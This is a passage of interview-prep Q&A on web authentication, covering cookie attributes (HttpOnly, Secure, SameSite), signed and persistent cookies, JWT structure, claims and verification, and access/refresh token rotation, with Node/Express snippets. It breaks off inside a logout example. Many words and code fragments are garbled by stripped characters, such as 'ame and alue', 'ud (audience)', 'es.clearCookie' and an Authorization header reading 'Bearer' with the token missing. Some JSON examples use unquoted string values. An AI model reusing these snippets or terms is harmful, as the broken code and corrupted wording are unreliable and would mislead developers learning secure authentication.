An HTTP cookie is a small piece of data stored in the user's browser, sent with every request to the domain that created it. Cookies maintain state in stateless HTTP protocol, enabling session management, personalization, and tracking. I use cookies primarily for session IDs, CSRF tokens, and user preferences.

Cookies have several attributes I configure: 
ame and alue (the data), domain (which domains can access it), path (URL path scope), httpOnly (prevents JavaScript access), secure (HTTPS only), sameSite (CSRF protection), and maxAge/expires (lifetime).

`javascript
// Setting a cookie
res.cookie('session_id', 'abc123', {
  domain: '.myapp.com',
  path: '/',
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 86400000 // 24 hours
});

// Clearing a cookie
res.clearCookie('session_id', {
  domain: '.myapp.com',
  path: '/'
});
`

Cookies are automatically sent by the browser, which is both convenient (automatic session management) and risky (CSRF attacks). This is why sameSite and CSRF tokens are essential security measures.

## Key Points:
- Small data stored in browser, sent with every request to creating domain
- Maintains state in stateless HTTP protocol
- Key attributes: domain, path, httpOnly, secure, sameSite, maxAge
- Automatically sent by browser (convenient but enables CSRF)
- Used for session management, CSRF tokens, and preferences

## Interview Tip:
Explain why cookies are sent automatically and how that leads to CSRF vulnerabilities.

---

## Question: What is the difference between cookies and localStorage?

## Answer:
Cookies and localStorage serve different purposes. Cookies are sent with every HTTP request, making them suitable for authentication (session IDs, tokens). localStorage is only accessible via JavaScript and is never automatically sent to the server, making it suitable for client-side preferences and cached data.

Cookies have expiration dates and can be set to expire; localStorage persists until explicitly cleared. Cookies support security attributes (httpOnly, secure, sameSite); localStorage has no built-in security attributes. Cookies have a 4KB size limit; localStorage has 5-10MB.

For authentication, I prefer httpOnly cookies because JavaScript can't access them, preventing XSS-based token theft. If I store tokens in localStorage, they're vulnerable to any XSS attack that can run JavaScript on the page.

`javascript
// Cookie: Sent automatically with requests
// Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict

// localStorage: Only accessible via JavaScript
localStorage.setItem('token', 'abc123');
// NEVER sent automatically -- must be added to headers manually
// Vulnerable to XSS: malicious script can read localStorage
`

## Key Points:
- Cookies sent automatically with every request; localStorage is not
- Cookies: 4KB limit; localStorage: 5-10MB
- Cookies support security attributes; localStorage does not
- localStorage persists until explicitly cleared; cookies have expiration
- For auth tokens, prefer httpOnly cookies (XSS protection)
- localStorage is better for non-sensitive client-side data

## Interview Tip:
Emphasize the XSS vulnerability of storing auth tokens in localStorage.

---

## Question: What is the difference between cookies and sessionStorage?

## Answer:
Cookies and sessionStorage are similar in that both are temporary, but they differ in scope and transmission behavior. Cookies are sent with every HTTP request to their domain; sessionStorage is only accessible within the same browser tab and is never sent to the server.

SessionStorage is scoped to the browser tab -- closing the tab destroys the data. Cookies can persist across tabs and browser restarts (with appropriate maxAge). sessionStorage has 5MB storage; cookies have 4KB.

For authentication, I use httpOnly cookies because they're sent automatically and protected from JavaScript access. sessionStorage is useful for temporary client-side state like form progress or one-time tokens that shouldn't persist beyond the session.

`javascript
// Cookie: Sent with requests, accessible across tabs
// Set-Cookie: session=abc; HttpOnly; Path=/

// SessionStorage: Tab-scoped, never sent to server
sessionStorage.setItem('formDraft', 'data');
// Only accessible in same tab, destroyed on tab close
`

Key difference: cookies are for server-communication and persistence, sessionStorage is for client-side temporary state within a single tab.

## Key Points:
- Cookies sent with requests; sessionStorage is tab-scoped only
- Cookies accessible across tabs; sessionStorage per-tab only
- Cookies: 4KB; sessionStorage: 5MB
- SessionStorage destroyed when tab closes; cookies persist with maxAge
- Cookies support security attributes; sessionStorage does not
- For auth: use httpOnly cookies; sessionStorage for temp client state

## Interview Tip:
Clarify that sessionStorage is NOT sent to the server automatically -- this is a common misconception.

---

## Question: What is an HttpOnly cookie?

## Answer:
An httpOnly cookie is a cookie that cannot be accessed via JavaScript (document.cookie), only sent automatically by the browser with HTTP requests. This is a critical security attribute for session cookies and authentication tokens because it prevents XSS attacks from stealing session data.

Without httpOnly, a malicious script injected via XSS can read document.cookie and send the session ID to an attacker's server. With httpOnly, JavaScript simply cannot see the cookie, making XSS-based session theft impossible.

`javascript
// Insecure: JavaScript can read this cookie
res.cookie('session', 'abc123', { secure: true });

// Secure: JavaScript CANNOT read this cookie
res.cookie('session', 'abc123', { 
  httpOnly: true,  // Prevents JavaScript access
  secure: true,
  sameSite: 'strict'
});

// document.cookie will NOT show httpOnly cookies
`

I always set httpOnly: true for session cookies, authentication tokens, and any sensitive cookie. Non-sensitive cookies like UI preferences don't need this attribute.

## Key Points:
- Prevents JavaScript access (document.cookie)
- Critical protection against XSS-based session theft
- Cookie only sent via HTTP requests, not accessible to scripts
- Always use for session IDs and authentication tokens
- Does NOT prevent CSRF -- combine with sameSite attribute

## Interview Tip:
Emphasize that httpOnly prevents XSS theft but not CSRF -- you need sameSite for that.

---

## Question: What is the Secure cookie attribute?

## Answer:
The Secure cookie attribute ensures the cookie is only sent over HTTPS connections, never over plain HTTP. This prevents session hijacking through network sniffing -- if an attacker intercepts HTTP traffic, they can't capture cookies marked as Secure.

In production, I always set Secure: true for all sensitive cookies. This ensures that even if a user accidentally visits the HTTP version of the site, the session cookie won't be transmitted. Combined with HTTP-to-HTTPS redirects, this creates a strong transport security layer.

`javascript
// Insecure: Cookie sent over HTTP and HTTPS
res.cookie('session', 'abc123');

// Secure: Cookie only sent over HTTPS
res.cookie('session', 'abc123', { 
  secure: true,  // HTTPS only
  httpOnly: true,
  sameSite: 'strict'
});
`

I also enable HSTS (HTTP Strict Transport Security) headers to force browsers to use HTTPS, ensuring Secure cookies are always transmitted properly.

## Key Points:
- Ensures cookie is only sent over HTTPS
- Prevents session hijacking via network sniffing
- Always enable in production for sensitive cookies
- Combine with HSTS headers for stronger transport security
- May need conditional logic for development (localhost)

## Interview Tip:
Mention that Secure + httpOnly + sameSite is the trifecta for cookie security.

---

## Question: What is the SameSite cookie attribute?

## Answer:
The SameSite cookie attribute controls how cookies are sent with cross-site requests, providing CSRF protection. I set this on all sensitive cookies to prevent cross-site request forgery attacks. The attribute has three values: Strict, Lax, and None.

Strict cookies are never sent with cross-site requests -- even clicking a link from an external site won't include the cookie. Lax cookies are sent with top-level navigation (GET requests from links) but not with cross-site form submissions or AJAX. None allows cross-site cookies but requires Secure: true.

`javascript
// Strict: Most secure, but may break UX
res.cookie('session', 'abc123', { sameSite: 'strict' });

// Lax: Good balance (recommended default)
res.cookie('session', 'abc123', { sameSite: 'lax' });

// None: Only for cross-site scenarios (requires Secure)
res.cookie('session', 'abc123', { sameSite: 'none', secure: true });
`

I typically use Lax for session cookies because it prevents CSRF while allowing normal navigation. Strict is for highly sensitive applications where any cross-site transmission is unacceptable.

## Key Points:
- Strict: Never sent cross-site (most secure, may break UX)
- Lax: Sent with top-level navigation, not with forms/AJAX (recommended)
- None: Sent cross-site (requires Secure attribute)
- Prevents CSRF by blocking cross-site cookie transmission
- Lax is the best default for most applications
- Browser defaults to Lax if attribute is not set

## Interview Tip:
Know the difference between Lax and Strict -- Lax is usually the better default.

---

## Question: What are the values of SameSite?

## Answer:
SameSite has three values: Strict, Lax, and None. Strict means the cookie is never sent with cross-site requests -- even navigating to the site from an external link won't include the cookie. Lax sends cookies with top-level navigations (GET requests via links, forms) but blocks them with cross-site AJAX, iframes, and POST forms. None explicitly allows cross-site cookie transmission but requires the Secure attribute.

`javascript
// Strict: No cross-site transmission at all
res.cookie('session', 'abc123', { sameSite: 'strict', httpOnly: true, secure: true });

// Lax: Top-level navigation allowed (recommended)
res.cookie('session', 'abc123', { sameSite: 'lax', httpOnly: true, secure: true });

// None: Full cross-site (requires Secure)
res.cookie('session', 'abc123', { sameSite: 'none', secure: true, httpOnly: true });
`

## Key Points:
- Strict: No cross-site transmission, breaks navigation from external links
- Lax: Top-level navigation only, recommended default
- None: Full cross-site, requires Secure attribute
- Browser defaults to Lax when attribute is omitted
- Choose based on cross-site requirements of your application

## Interview Tip:
Know the default behavior -- browsers default to Lax, and you should be explicit about your choice.

---

## Question: What is a signed cookie?

## Answer:
A signed cookie includes a cryptographic signature to detect tampering. While httpOnly and Secure protect against theft and interception, signed cookies ensure the cookie value hasn't been modified by the client. If an attacker changes the cookie value, the signature won't match and the cookie is rejected.

I use signed cookies for sensitive data that might be stored in cookies, like user preferences or session identifiers. The server signs the cookie with a secret key and verifies the signature on each request.

Note that signed cookies are not encrypted cookies. The value is still visible in plain text -- the signature only ensures integrity, not confidentiality. For sensitive data, I use encrypted cookies or keep data server-side.

## Key Points:
- Detects cookie value tampering using cryptographic signatures
- Server signs with secret key, verifies signature on each request
- Ensures integrity but NOT confidentiality (value still visible)
- Use with cookie-parser middleware in Express
- For sensitive data, use encryption or server-side storage instead

## Interview Tip:
Clarify that signed does not equal encrypted -- signing prevents tampering, encryption prevents reading.

---

## Question: What is a persistent cookie?

## Answer:
A persistent cookie has an expiration date and survives browser restarts. When maxAge or expires is set, the browser stores the cookie on disk and continues sending it after the browser is closed. Without these attributes, cookies are session cookies that disappear when the browser closes.

I use persistent cookies for remember me functionality and user preferences that should survive across sessions. For authentication, I prefer session cookies (no expiration) because they provide better security -- closing the browser automatically ends the session.

Persistent cookies require careful consideration -- longer lifetime means longer window for theft. I always combine them with strong security attributes and implement token revocation capabilities.

## Key Points:
- Has expiration date, survives browser restarts
- Stored on disk by the browser
- Use for remember me and persistent preferences
- Session cookies (no maxAge) are more secure for auth
- Longer lifetime = longer theft window
- Always combine with httpOnly, secure, sameSite attributes

## Interview Tip:
Explain the security trade-off: convenience vs. longer exposure window for potential theft.

---

## Question: What cookie security best practices do you follow?

## Answer:
I follow a strict cookie security checklist. For sensitive cookies (sessions, tokens), I always set: httpOnly: true (prevents XSS theft), secure: true (HTTPS only), sameSite: 'lax' or 'strict' (CSRF protection), and appropriate maxAge (limits exposure window). I use descriptive cookie names instead of defaults like connect.sid.

I never store sensitive data in cookies -- only session IDs or tokens. I implement proper cookie cleanup on logout using es.clearCookie(). I also configure cookie domain and path to limit scope.

`javascript
// Secure cookie configuration
const secureCookieOptions = {
  httpOnly: true,
  secure: true,
  sameSite: 'lax',
  maxAge: 3600000, // 1 hour
  path: '/',
  domain: '.myapp.com'
};

// Session cookie
res.cookie('app_session', sessionId, secureCookieOptions);

// Clear on logout
app.post('/logout', (req, res) => {
  res.clearCookie('app_session', { path: '/', domain: '.myapp.com' });
  req.session.destroy();
  res.json({ message: 'Logged out' });
});
`

## Key Points:
- Always set httpOnly, secure, sameSite for sensitive cookies
- Use descriptive cookie names, set appropriate maxAge
- Never store sensitive data in cookie values
- Clean up cookies on logout with clearCookie()
- Limit cookie scope with domain and path
- Rotate cookies after authentication events

## Interview Tip:
List the attributes from memory and explain what each one prevents.


---

# JWT (JSON Web Token) (31-40)

## Question: What is JWT?

## Answer:
JSON Web Token (JWT) is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. JWTs are self-contained -- they carry all the information needed for authentication in the token itself, making them ideal for stateless systems where the server doesn't need to store session data.

I use JWTs for API authentication, microservice communication, and single sign-on implementations. A JWT consists of three parts: header (algorithm and token type), payload (claims/data), and signature (verification). They're encoded in Base64URL format.

`javascript
// JWT structure: Header.Payload.Signature
const token = jwt.sign(
  { userId: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '1h' }
);

// Verifying a JWT
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET);
  req.user = decoded;
} catch (err) {
  res.status(401).json({ error: 'Invalid token' });
}
`

JWTs are great for scalability (no server-side state) but require careful handling: short expiration times, secure storage, and proper invalidation strategies.

## Key Points:
- Self-contained token carrying authentication data
- Three parts: header, payload, signature
- Stateless -- no server-side session storage needed
- Ideal for APIs and microservice communication
- Requires careful expiration and invalidation strategy
- Base64URL encoded, not encrypted (payload is readable)

## Interview Tip:
Emphasize that JWTs are signed, not encrypted -- the payload is readable by anyone.

---

## Question: Why was JWT introduced?

## Answer:
JWT was introduced to solve the scalability limitations of session-based authentication. Traditional sessions require server-side storage, which doesn't work well in distributed systems, microservices, and serverless architectures. JWTs enable stateless authentication where the token itself contains all necessary information.

Before JWT, APIs used custom token formats or API keys that lacked standardization. JWT provided a universal standard that works across languages and platforms. It also solved the cross-domain authentication problem -- a JWT issued by one service can be verified by another without shared session storage.

`javascript
// Before JWT: Sessions require shared storage
// Server 1 -> Redis -> Server 2 (session lookup)

// After JWT: Stateless verification
// Server 1 -> Verify JWT locally -> Done
// No shared storage needed, horizontal scaling
`

## Key Points:
- Solves session scalability in distributed systems
- Enables stateless authentication across microservices
- Provides a universal, language-agnostic standard
- Eliminates need for shared session storage
- Reduces latency by removing session lookup round-trips

## Interview Tip:
Connect JWT to microservices architecture -- it's the natural solution for distributed auth.

---

## Question: What are the three parts of a JWT?

## Answer:
A JWT has three Base64URL-encoded parts separated by dots: header, payload, and signature. The header specifies the signing algorithm (like HS256 or RS256) and token type. The payload contains claims -- statements about the entity (user) and additional metadata. The signature ensures the token hasn't been tampered with.

`javascript
// JWT structure
// eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiIxMjM0NSJ9.signature

// Header
{ alg: HS256, typ: JWT }

// Payload (claims)
{
  sub: 12345,
  name: John Doe,
  role: admin,
  iat: 1700000000,
  exp: 1700003600
}

// Signature
HMACSHA256(
  base64UrlEncode(header) + . + base64UrlEncode(payload),
  secret
);
`

The signature is critical -- it prevents token tampering. If someone modifies the payload, the signature won't match and verification fails. However, the header and payload are readable by anyone -- they're just Base64URL encoded, not encrypted.

## Key Points:
- Header: algorithm and token type
- Payload: claims (user data, expiration, issued-at)
- Signature: ensures integrity and prevents tampering
- Separated by dots: header.payload.signature
- Payload is readable (Base64URL, not encrypted)
- Signature verifies token integrity

## Interview Tip:
Decode a JWT at jwt.io during the interview to show practical understanding.

---

## Question: How is a JWT generated?

## Answer:
JWT generation involves creating the header, payload, and signature, then Base64URL-encoding and concatenating them. The header specifies the algorithm and type. The payload contains claims like user ID, roles, and expiration time. The signature is created by hashing the encoded header and payload with a secret key.

`javascript
const jwt = require('jsonwebtoken');

// Generation with jsonwebtoken library
const token = jwt.sign(
  {
    sub: user.id,        // Subject (user ID)
    name: user.name,
    role: user.role,
    iat: Math.floor(Date.now() / 1000),  // Issued at
  },
  process.env.JWT_SECRET,
  {
    algorithm: 'HS256',
    expiresIn: '1h'
  }
);
`

I never include sensitive data (passwords, secrets) in JWT payloads since they're readable. I also set appropriate expiration times -- 15 minutes for access tokens, longer for refresh tokens.

## Key Points:
- Header specifies algorithm and token type
- Payload contains claims (user data, expiration)
- Signature uses secret key to hash header + payload
- Never include sensitive data in payload (readable)
- Set appropriate expiration based on token purpose
- Use established libraries, not manual implementation

## Interview Tip:
Walk through the generation process step by step -- it shows deep understanding.

---

## Question: How is a JWT verified?

## Answer:
JWT verification checks the signature to ensure the token hasn't been tampered with and was issued by a trusted source. The server extracts the header and payload, recomputes the signature using the stored secret/public key, and compares it to the token's signature. If they match, the token is valid.

`javascript
const jwt = require('jsonwebtoken');

// Verification
try {
  const decoded = jwt.verify(token, process.env.JWT_SECRET, {
    algorithms: ['HS256']  // Restrict allowed algorithms
  });
  req.user = decoded;
  next();
} catch (err) {
  if (err.name === 'TokenExpiredError') {
    return res.status(401).json({ error: 'Token expired' });
  }
  if (err.name === 'JsonWebTokenError') {
    return res.status(401).json({ error: 'Invalid token' });
  }
  return res.status(500).json({ error: 'Token verification failed' });
}

// For RS256 (asymmetric): Verify with public key
const decoded = jwt.verify(token, publicKey, { algorithms: ['RS256'] });
`

I always specify the allowed algorithms explicitly to prevent algorithm confusion attacks. For asymmetric algorithms (RS256), the server verifies with the public key while the issuer signs with the private key.

## Key Points:
- Server recomputes signature and compares to token's signature
- If match -> token is valid; if mismatch -> token is invalid/tampered
- Always specify allowed algorithms explicitly
- Handle expiration and invalid token errors separately
- For RS256, verify with public key (asymmetric)

## Interview Tip:
Mention algorithm confusion attacks and why you restrict allowed algorithms.

---

## Question: What claims are commonly included in a JWT?

## Answer:
JWT claims are statements about the token and its subject. Registered claims include iss (issuer), sub (subject), ud (audience), exp (expiration), 
bf (not before), iat (issued at), and jti (JWT ID). These provide standardized metadata for token validation.

I include custom claims for application-specific data like user roles, permissions, and tenant ID. The key rule is to never include sensitive data (passwords, secrets) since the payload is readable.

`javascript
// Common JWT claims
const payload = {
  // Registered claims
  iss: 'myapp.com',           // Issuer
  sub: 'user123',             // Subject (user ID)
  aud: 'api.myapp.com',       // Audience
  exp: Math.floor(Date.now()/1000) + 3600,  // Expiration
  iat: Math.floor(Date.now()/1000),          // Issued at
  jti: 'unique-token-id',     // JWT ID (for revocation)
  
  // Custom claims (application-specific)
  role: 'admin',
  permissions: ['read', 'write', 'delete'],
  tenantId: 'org_123'
};
`

## Key Points:
- Registered: iss, sub, aud, exp, nbf, iat, jti
- Custom: application-specific (roles, permissions, tenant)
- Never include sensitive data (passwords, secrets)
- Keep payloads minimal for performance
- Use jti for token revocation/blacklisting
- Include only what the receiving service needs

## Interview Tip:
List the registered claims and explain when you'd use each one.

---

## Question: What is the difference between public and private claims?

## Answer:
Public claims are registered in the IANA JWT Claims Registry and have standard meanings. Private claims are custom claims defined by the application for its specific needs. Public claims ensure interoperability across systems; private claims are specific to your application.

Public claims like iss, sub, exp, iat have agreed-upon semantics that any JWT-aware system can understand. Private claims like userId, ole, 	enantId are application-specific and must be documented.

`javascript
// Public claims (registered)
{
  sub: 'user123',    // Standard: Subject
  iss: 'myapp.com',  // Standard: Issuer
  exp: 1700003600,   // Standard: Expiration
  iat: 1700000000    // Standard: Issued at
}

// Private claims (application-specific)
{
  userId: 'user123',      // Custom
  role: 'admin',          // Custom
  tenantId: 'org_123',    // Custom
  permissions: ['read']   // Custom
}
`

## Key Points:
- Public claims: registered in IANA registry, standard semantics
- Private claims: custom, application-specific
- Public claims ensure cross-system interoperability
- Private claims must be documented for your application
- Use standard claims when they fit your needs

## Interview Tip:
Know which claims are registered vs. custom -- shows understanding of JWT standards.

---

## Question: What is the exp claim?

## Answer:
The exp (expiration time) claim indicates when the JWT expires and should no longer be accepted. It's a Unix timestamp (seconds since epoch). After this time, the token is considered invalid and should be rejected by the server.

I set exp for every access token I create -- typically 15 minutes for access tokens and 7-30 days for refresh tokens. Short expiration limits the window of vulnerability if a token is compromised.

`javascript
// Setting expiration
const token = jwt.sign(
  { userId: user.id },
  secret,
  { expiresIn: '1h' }  // Sets exp claim automatically
);

// Verification checks expiration automatically
jwt.verify(token, secret); // Throws TokenExpiredError if expired
`

The exp claim works with the 
bf (not before) claim to define a validity window. I also implement server-side token blacklisting for immediate revocation when needed, since exp only prevents future use, not past compromise.

## Key Points:
- Unix timestamp indicating when token expires
- Server rejects tokens after expiration
- Access tokens: 15 minutes typical; refresh tokens: longer
- Short expiration limits vulnerability window
- Combine with server-side blacklisting for immediate revocation
- Works with 
bf (not before) claim for validity window

## Interview Tip:
Explain the relationship between exp and refresh tokens -- access tokens expire quickly, refresh tokens extend sessions.

---

## Question: What is the iat claim?

## Answer:
The iat (issued at) claim indicates when the JWT was created. It's a Unix timestamp (seconds since epoch). While not used for validation directly, iat helps with token age calculations, rotation policies, and debugging.

I include iat in every token and use it to calculate how long a token has been active. Some systems use iat in conjunction with exp to enforce maximum token lifetimes.

`javascript
// iat is set automatically
const token = jwt.sign({ userId: user.id }, secret, { expiresIn: '1h' });

// Reading iat
const decoded = jwt.verify(token, secret);
console.log(decoded.iat); // Unix timestamp when token was created
console.log(decoded.exp - decoded.iat); // Token lifetime in seconds
`

iat is useful for token rotation policies -- I can check if a refresh token is too old and force re-authentication.

## Key Points:
- Indicates when the JWT was created (Unix timestamp)
- Set automatically by JWT libraries
- Used for token age calculations and rotation policies
- Helps with debugging and security investigations
- Not used for direct validation but provides useful metadata

## Interview Tip:
Mention using iat for token rotation and audit logging.

---

## Question: What JWT best practices do you follow?

## Answer:
I follow strict JWT security practices. I use short expiration times (15 minutes for access tokens), implement refresh token rotation, and never store sensitive data in payloads. I always validate the iss, ud, and exp claims, specify allowed algorithms explicitly, and use strong signing keys (256+ bits for HMAC, 2048+ bits for RSA).

`javascript
// Best practices in implementation
const token = jwt.sign(
  { sub: user.id, role: user.role },
  process.env.JWT_PRIVATE_KEY,
  { 
    algorithm: 'RS256',
    expiresIn: '15m',
    issuer: 'myapp.com',
    audience: 'api.myapp.com'
  }
);

// Strict verification
const decoded = jwt.verify(token, process.env.JWT_PUBLIC_KEY, {
  algorithms: ['RS256'],
  issuer: 'myapp.com',
  audience: 'api.myapp.com',
  maxAge: '1h'
});
`

Additional practices: use JTI for revocation, store tokens securely (httpOnly cookies, not localStorage), implement token rotation, and validate tokens on every request.

## Key Points:
- Short expiration (15 minutes for access tokens)
- Never store sensitive data in payload
- Validate iss, aud, exp claims on verification
- Specify allowed algorithms explicitly
- Use asymmetric keys (RS256) in production
- Implement token blacklisting for revocation

## Interview Tip:
Have a mental checklist of JWT security practices -- it demonstrates production experience.


---

# Access & Refresh Tokens (41-50)

## Question: What is an access token?

## Answer:
An access token is a short-lived credential that authorizes API requests. It's typically a JWT containing user identity and permissions, with an expiration of 15 minutes or less. I send access tokens in the Authorization header for API calls.

The short lifespan limits the window of exposure if a token is compromised. When the access token expires, the client uses a refresh token to obtain a new one without requiring user re-authentication.

`javascript
// Creating an access token
const accessToken = jwt.sign(
  { sub: user.id, role: user.role },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

// Client sends it in requests
fetch('/api/data', {
  headers: { 'Authorization': Bearer  }
});

// Server verifies on each request
function authenticateToken(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (err) {
    res.status(401).json({ error: 'Invalid token' });
  }
}
`

Access tokens should be stateless -- the server verifies them without database lookups. If immediate revocation is needed, I implement a token blacklist using Redis.

## Key Points:
- Short-lived (15 minutes typical)
- Contains user identity and permissions
- Sent in Authorization header: Bearer <token>
- Stateless verification -- no database lookup needed
- Limits exposure window if compromised
- Use refresh tokens to obtain new access tokens

## Interview Tip:
Explain the access/refresh token pair -- access tokens for API calls, refresh tokens for renewal.

---

## Question: What is a refresh token?

## Answer:
A refresh token is a long-lived credential used to obtain new access tokens without re-authenticating. It's typically stored securely on the server or in an httpOnly cookie and is used only when the access token expires. Refresh tokens have longer lifetimes (7-30 days) but can be revoked immediately.

The flow is: user authenticates -> receives access + refresh tokens -> uses access token for API calls -> access token expires -> uses refresh token to get new access token -> repeat.

`javascript
// Token pair generation
const accessToken = jwt.sign(
  { sub: user.id },
  process.env.JWT_SECRET,
  { expiresIn: '15m' }
);

const refreshToken = jwt.sign(
  { sub: user.id, type: 'refresh' },
  process.env.JWT_REFRESH_SECRET,
  { expiresIn: '7d' }
);

// Refresh endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  try {
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
    if (await isTokenRevoked(refreshToken)) {
      return res.status(401).json({ error: 'Token revoked' });
    }
    const user = await db.findUser(decoded.sub);
    const newAccessToken = jwt.sign(
      { sub: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '15m' }
    );
    res.json({ accessToken: newAccessToken });
  } catch (err) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
`

I store refresh tokens in a database with revocation status and implement rotation -- each use generates a new refresh token, invalidating the old one.

## Key Points:
- Long-lived (7-30 days) but revocable
- Used to obtain new access tokens
- Stored securely (server-side or httpOnly cookie)
- Implement rotation: each use generates new refresh token
- Must support immediate revocation for security
- Separate signing secret from access tokens

## Interview Tip:
Explain refresh token rotation -- it's a critical security practice.

---

## Question: What is the difference between access tokens and refresh tokens?

## Answer:
Access tokens are short-lived (15 minutes) credentials for API requests, while refresh tokens are long-lived (7-30 days) credentials for obtaining new access tokens. Access tokens are sent with every API request; refresh tokens are only used at the /refresh endpoint.

Access tokens are stateless (verified without database lookup); refresh tokens are typically stored server-side for revocation capability. Access tokens can be JWTs; refresh tokens can be opaque tokens or JWTs with JTI for tracking.

`javascript
// Access token: Short-lived, sent with requests
const accessToken = jwt.sign({ sub: user.id }, secret, { expiresIn: '15m' });

// Refresh token: Long-lived, stored securely
const refreshToken = jwt.sign(
  { sub: user.id, jti: uuid(), type: 'refresh' },
  refreshSecret,
  { expiresIn: '7d' }
);
`

| Aspect | Access Token | Refresh Token |
|--------|-------------|---------------|
| Lifetime | 15 minutes | 7-30 days |
| Usage | Every API request | Only at /refresh |
| Storage | Client-side | Server-side/httpOnly |
| Revocation | Via blacklist | Direct deletion |
| Statelessness | Yes | No (needs DB check) |

## Key Points:
- Access: short-lived, every request, stateless
- Refresh: long-lived, only at /refresh, revocable
- Access tokens are verified without DB lookup
- Refresh tokens require DB lookup for revocation
- Separate signing secrets for each type

## Interview Tip:
Use the table format in interviews -- it clearly shows the differences.

---

## Question: Why should access tokens have short expiration times?

## Answer:
Short expiration times limit the damage window if an access token is compromised. If a token is stolen via XSS or network sniffing, it becomes useless after expiration. A 15-minute window is much safer than a token valid for hours or days.

`javascript
// Insecure: Long-lived access token
const token = jwt.sign({ sub: user.id }, secret, { expiresIn: '24h' });
// If stolen, attacker has 24 hours to exploit

// Secure: Short-lived access token
const accessToken = jwt.sign({ sub: user.id }, secret, { expiresIn: '15m' });
// Stolen token expires in 15 minutes
`

I implement short-lived access tokens (15 minutes) paired with refresh tokens. This provides security without sacrificing UX -- users don't need to re-authenticate frequently because refresh tokens silently renew access tokens.

## Key Points:
- Limits damage window if token is compromised
- 15 minutes is a common secure lifetime
- Prevents long-term exploitation of stolen tokens
- Refresh tokens provide seamless renewal
- Trade-off: more refresh requests, but negligible cost

## Interview Tip:
Quantify the risk -- a stolen token valid for 24 hours gives attackers 24 hours to exploit it.

---

## Question: How do refresh tokens work?

## Answer:
Refresh tokens enable long-lived authentication without keeping access tokens alive indefinitely. The flow is: user authenticates -> receives access + refresh tokens -> uses access token -> it expires -> sends refresh token to /refresh endpoint -> receives new access token -> repeat.

`javascript
// Refresh token flow
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;
  const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);
  
  if (await isRefreshTokenRevoked(decoded.jti)) {
    return res.status(401).json({ error: 'Token revoked' });
  }
  
  await revokeRefreshToken(decoded.jti); // Rotation
  
  const user = await db.findUser(decoded.sub);
  const newAccessToken = jwt.sign(
    { sub: user.id, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  const newRefreshToken = jwt.sign(
    { sub: user.id, jti: uuid(), type: 'refresh' },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );
  
  await storeRefreshToken(newRefreshToken);
  res.json({ accessToken: newAccessToken, refreshToken: newRefreshToken });
});
`

I implement refresh tokens with rotation -- each refresh generates a new refresh token and invalidates the old one.

## Key Points:
- Enables long-lived sessions without extending access token lifetime
- Used only when access token expires
- Implement rotation: each use generates new refresh token
- Revoke old refresh token on each use
- Store refresh tokens server-side for revocation capability

## Interview Tip:
Explain the rotation flow -- it's a security-critical detail interviewers want to hear.

---

## Question: Where should refresh tokens be stored?

## Answer:
I store refresh tokens securely depending on the client type. For web applications, I use httpOnly, secure cookies -- they're not accessible to JavaScript and are automatically sent by the browser. For mobile apps, I use secure storage like Keychain (iOS) or KeyStore (Android).

I never store refresh tokens in localStorage or sessionStorage -- they're accessible to any XSS attack. The token should be transmitted over HTTPS only and protected with all cookie security attributes.

`javascript
// Web app: httpOnly cookie
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  path: '/api/auth'
});

// Server-side: Store with revocation status
await db.storeRefreshToken({
  jti: decoded.jti,
  userId: user.id,
  expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  revoked: false
});
`

## Key Points:
- Web apps: httpOnly, secure cookies (not accessible to JavaScript)
- Mobile apps: secure storage (Keychain/KeyStore)
- Never use localStorage/sessionStorage (XSS vulnerability)
- Server-side storage with revocation status
- Transmit only over HTTPS

## Interview Tip:
Emphasize httpOnly cookies -- localStorage is a common XSS vulnerability.

---

## Question: How do you revoke refresh tokens?

## Answer:
Refresh tokens must be revocable for immediate logout and security incidents. I implement revocation by storing refresh tokens in a database with a revoked flag. When a user logs out or a security event occurs, I mark the token as revoked.

`javascript
// Revoking a refresh token
app.post('/api/auth/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (refreshToken) {
    const decoded = jwt.decode(refreshToken);
    await db.revokeRefreshToken(decoded.jti);
  }
  res.clearCookie('refreshToken');
  res.json({ message: 'Logged out' });
});

// Checking revocation during refresh
const isRevoked = await db.isRefreshTokenRevoked(decoded.jti);
if (isRevoked) {
  return res.status(401).json({ error: 'Token revoked' });
}
`

I also revoke all refresh tokens when a user changes their password or when a security incident is detected.

## Key Points:
- Store refresh tokens with revocation status in database
- Implement immediate revocation via Redis blacklist
- Revoke on logout, password change, security incidents
- Check revocation status during token refresh
- Revoke all tokens for a user when security requires it

## Interview Tip:
Mention revoking all tokens on password change -- it's a security best practice.

---

## Question: How do you implement logout with JWT?

## Answer:
JWT logout is challenging because tokens are stateless -- the server doesn't track active tokens. I implement logout by revoking the refresh token (preventing new access tokens) and optionally blacklisting the current access token.

`javascript
// Logout implementation
app.post('/api/auth/logout', async (req, res) => {
  // 1. Revoke refresh token
  const refreshToken = req.cookies.refreshToken;
  if (refreshToken) {
    const decoded = jwt.decode(refreshToken);
    await db.revokeRefreshToken(decoded.jti);
    res.clearCookie('refreshToken');
  }
  
  // 2. Optionally blacklist current access token
  const accessToken = req.headers.authorization?.split(' ')[1];
  if (accessToken) {
